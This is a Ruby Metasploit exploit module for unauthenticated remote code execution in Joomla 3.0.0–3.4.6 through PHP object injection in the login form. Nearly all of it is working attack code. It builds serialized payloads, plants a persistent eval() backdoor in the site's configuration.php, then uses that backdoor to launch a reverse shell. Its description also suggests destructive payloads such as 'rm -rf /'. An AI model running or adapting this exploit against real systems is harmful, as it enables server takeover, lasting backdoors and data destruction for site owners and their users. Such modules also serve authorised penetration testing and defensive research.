##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HTTP::Joomla

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Rusty Joomla Unauthenticated Remote Code Execution',
      'Description'    => %q{
	PHP Object Injection because of a downsize in the read/write process with the database leads to RCE.
	The exploit will backdoor the configuration.php file in the root directory with en eval of a POST parameter.
	That's because the exploit is more reliabale (doesn't rely on common disabled function). 
	For this reason, use it with caution and remember the house cleaning.
	Btw, you can also edit this exploit and use whatever payload you want. just modify the exploit object with 
	get_payload('you_php_function','your_parameters'), e.g. get_payload('system','rm -rf /') and enjoy
      },
      'Author'	=>
        [
          'Alessandro \'kiks\' Groppo @Hacktive Security', 
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
		['URL', 'https://blog.hacktivesecurity.com/index.php?controller=post&action=view&id_post=41'],
		['URL', 'https://github.com/kiks7/rusty_joomla_rce']
        ],
      'Privileged'     => false, 
      'Platform'       => 'PHP',
      'Arch'           => ARCH_PHP,
      'Targets'        => [['Joomla 3.0.0 - 3.4.6', {}]],
      'DisclosureDate' => 'Oct 02  2019',
      'DefaultTarget'  => 0)
    )

    register_advanced_options(
      [
        OptBool.new('FORCE', [true, 'Force run even if check reports the service is safe.', false]),
      ])
  end

  def get_random_string(length=50)
  	source=("a".."z").to_a + ("A".."Z").to_a + (0..9).to_a 
	key=""
	length.times{ key += source[rand(source.size)].to_s }
	return key
  end

  def get_session_token
	# Get session token from cookies
	vprint_status('Getting Session Token')
	res = send_request_cgi({
		'method' => 'GET',
		'uri' 	 => normalize_uri(target_uri.path) 
	})
	
	cook = res.headers['Set-Cookie'].split(';')[0]
	vprint_status('Session cookie: ' + cook)
	return cook
  end

  def get_csrf_token(sess_cookie)
	  vprint_status('Getting CSRF Token')

	  res = send_request_cgi({
		'method' => 'GET',
		'uri'	 => normalize_uri(target_uri.path,'/index.php/component/users'),
		'headers' => {
			'Cookie' => sess_cookie,
		}
	  })

	  html = res.get_html_document
	  input_field = html.at('//form').xpath('//input')[-1]
	  token = input_field.to_s.split(' ')[2]
	  token = token.gsub('name="','').gsub('"','')
	  if token then
		  vprint_status('CSRF Token: ' + token)
		  return token
	  end
	  print_error('Cannot get the CSRF Token ..')

  end

  def get_payload(function, payload)
	  # @function: The PHP Function
	  # @payload: The payload for the call
	  template = 's:11:"maonnalezzo";O:21:"JDatabaseDriverMysqli":3:{s:4:"\\0\\0\\0a";O:17:"JSimplepieFactory":0:{}s:21:"\\0\\0\\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:5:"cache";b:1;s:19:"cache_name_function";s:FUNC_LEN:"FUNC_NAME";s:10:"javascript";i:9999;s:8:"feed_url";s:LENGTH:"PAYLOAD";}i:1;s:4:"init";}}s:13:"\\0\\0\\0connection";i:1;}'
	  # The http:// part is necessary in order to validate a condition in SimplePie::init and trigger the call_user_func with arbitrary values
	  payload = 'http://l4m3rz.l337/;' + payload
	  final = template.gsub('PAYLOAD',payload).gsub('LENGTH', payload.length.to_s).gsub('FUNC_NAME', function).gsub('FUNC_LEN', function.length.to_s)
	  return final
  end

 
  def get_payload_backdoor(param_name) 
	# return the backdoor payload
	# or better, the payload that will inject and eval function in configuration.php (in the root)
	# As said in other part of the code. we cannot create new .php file because we cannot use 
	# the ? character because of the check on URI schema
	function = 'assert'
        template = 's:11:"maonnalezzo";O:21:"JDatabaseDriverMysqli":3:{s:4:"\\0\\0\\0a";O:17:"JSimplepieFactory":0:{}s:21:"\\0\\0\\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:5:"cache";b:1;s:19:"cache_name_function";s:FUNC_LEN:"FUNC_NAME";s:10:"javascript";i:9999;s:8:"feed_url";s:LENGTH:"PAYLOAD";}i:1;s:4:"init";}}s:13:"\\0\\0\\0connection";i:1;}'                                                             
        # This payload will append an eval() at the end of the configuration file                                                                            
        payload =  "file_put_contents('configuration.php','if(isset($_POST[\\'"+param_name+"\\'])) eval($_POST[\\'"+param_name+"\\']);', FILE_APPEND) || $a=\'http://wtf\';"
	template['PAYLOAD']  = payload 
	template['LENGTH']   = payload.length.to_s
	template['FUNC_NAME'] = function 
	template['FUNC_LEN'] = function.length.to_s
        return template 

  end


  def check_by_exploiting
	    # Check that is vulnerable by exploiting it and try to inject a printr('something')
	    # Get the Session anb CidSRF Tokens
	    sess_token = get_session_token()
	    csrf_token = get_csrf_token(sess_token)

	    print_status('Testing with a POC object payload')

	    username_payload = '\\0\\0\\0' * 9
	    password_payload = 'AAA";'						# close the prev object
	    password_payload += get_payload('print_r','IAMSODAMNVULNERABLE')	# actual payload 
	    password_payload += 's:6:"return":s:102:' 				# close cleanly the object
	    res = send_request_cgi({
			'uri'	   => normalize_uri(target_uri.path,'/index.php/component/users'),
			'method'   => 'POST',
			'headers'  => 
				{
				'Cookie' => sess_token,
			},
			'vars_post' => {
				'username' => username_payload,
				'password' => password_payload,
				'option'   => 'com_users',
				'task'	   => 'user.login',
				csrf_token => '1',
			}
	    }) 
	    # Redirect in order to retrieve the output
	    if res.redirection then
		res_redirect = send_request_cgi({
			'method' => 'GET',
			'uri'	 => res.redirection.to_s,
			'headers' =>{
				'Cookie' => sess_token
			}
		})

		if 'IAMSODAMNVULNERABLE'.in? res.to_s or 'IAMSODAMNVULNERABLE'.in? res_redirect.to_s then
			return true
		else
			return false
		end
		
	    end
    end

  def check
    # Check if the target is UP and get the current version running by info leak    
    res = send_request_cgi({'uri' => normalize_uri(target_uri.path, '/administrator/manifests/files/joomla.xml')})
    unless res
      print_error("Connection timed out")
      return Exploit::CheckCode::Unknown
    end

    # Parse XML to get the version 
    if res.code == 200 then
	    xml = res.get_xml_document
	    version = xml.at('version').text
	    print_status('Identified version ' + version)
	    if version <= '3.4.6' and version >= '3.0.0' then
		    if check_by_exploiting()
			return Exploit::CheckCode::Vulnerable
		    else
			if check_by_exploiting() then
			# Try the POC 2 times. 
				return Exploit::CheckCode::Vulnerable
			else
				return Exploit::CheckCode::Safe
			end
		    end
	    else
		    return Exploit::CheckCode::Safe
	    end
    else
	    print_error('Cannot retrieve XML file for the Joomla Version. Try the POC in order to confirm if it\'s vulnerable')
	    if check_by_exploiting() then
		    return Exploit::CheckCode::Vulnerable
	    else
		    if check_by_exploiting() then
			return Exploit::CheckCode::Vulnerable
		    else
		    	return Exploit::CheckCode::Safe
		    end
	    end
    end
  end



  
  def exploit
    if check == Exploit::CheckCode::Safe && !datastore['FORCE']
      print_error('Target is not vulnerable')
      return
    end


    pwned = false
    cmd_param_name = get_random_string(50) 

    sess_token = get_session_token()
    csrf_token = get_csrf_token(sess_token)

    # In order to avoid problems with disabled functions
    # We are gonna append an eval() function at the end of the configuration.php file
    # This will not cause any problem to Joomla and is a good way to execute then PHP directly
    # cuz assert is toot annoying and with conditions that we have we cannot inject some characters
    # So we will use 'assert' with file_put_contents to append the string. then create a reverse shell with this backdoor
    # Oh i forgot, We cannot create a new file because we cannot use the '?' character in order to be interpreted by the web server.

    # TODO: Add the PHP payload object to inject the backdoor inside the configuration.php file
    # 		Use the implanted backdoor to receive a nice little reverse shell with a PHP payload

    
    # Implant the backdoor
    vprint_status('Cooking the exploit ..')
    username_payload = '\\0\\0\\0' * 9
    password_payload = 'AAA";'						# close the prev object
    password_payload += get_payload_backdoor(cmd_param_name)		# actual payload 
    password_payload += 's:6:"return":s:102:' 				# close cleanly the object

    print_status('Sending exploit ..')


    res = send_request_cgi({
		'uri'	   => normalize_uri(target_uri.path,'/index.php/component/users'),
		'method'   => 'POST',
		'headers'  => {
			'Cookie' => sess_token
		},
		'vars_post' => {
			'username' => username_payload,
			'password' => password_payload,
			'option'   => 'com_users',
			'task'	   => 'user.login',
			csrf_token => '1'
		}
    }) 

    print_status('Triggering the exploit ..')    
    if res.redirection then
	res_redirect = send_request_cgi({
		'method' => 'GET',
		'uri'	 => res.redirection.to_s,
		'headers' =>{
			'Cookie' => sess_token
		}
	})
    end

    # Ping the backdoor see if everything is ok :/
    res = send_request_cgi({
		'method'     => 'POST',
		'uri'	     => normalize_uri(target_uri.path,'configuration.php'),
		'vars_post'  => {
			cmd_param_name  => 'echo \'PWNED\';' 
		}
	})
    if res.to_s.include? 'PWNED' then
	print_status('Target P0WN3D! eval your code at /configuration.php with ' + cmd_param_name + ' in a POST')

        print_status('Now it\'s time to reverse shell')
		res = send_request_cgi({
		'method'     => 'POST',
		'uri'	     => normalize_uri(target_uri.path,'configuration.php'),
		'vars_post'  => {
			cmd_param_name  => payload.encoded 
		}
	})
    end

  end
end
